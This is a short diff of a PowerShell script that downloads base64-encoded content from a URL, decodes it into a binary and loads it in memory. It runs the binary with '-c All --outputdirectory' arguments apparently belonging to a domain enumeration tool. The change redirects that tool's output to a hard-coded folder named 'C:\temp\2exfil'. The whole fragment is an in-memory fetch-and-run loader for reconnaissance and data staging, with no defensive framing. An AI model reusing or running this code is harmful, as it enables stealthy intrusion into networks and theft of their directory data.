@@ -8,10 +8,11 @@ $base64Content = Invoke-RestMethod -Uri $url
 $binaryContent = [System.Convert]::FromBase64String($base64Content)
 
 # Get the current working directory
-$currentDirectory = (Get-Location).Path
+#$outputDirectory = (Get-Location).Path
+$outputDirectory = "C:\temp\2exfil"    # Outputting to specific directoy
 
 # Define the arguments required by the executable
-$arguments = "-c All --outputdirectory $currentDirectory"
+$arguments = "-c All --outputdirectory $outputDirectory"
 
 # Create a new memory stream and write the binary content to it
 $memoryStream = New-Object System.IO.MemoryStream
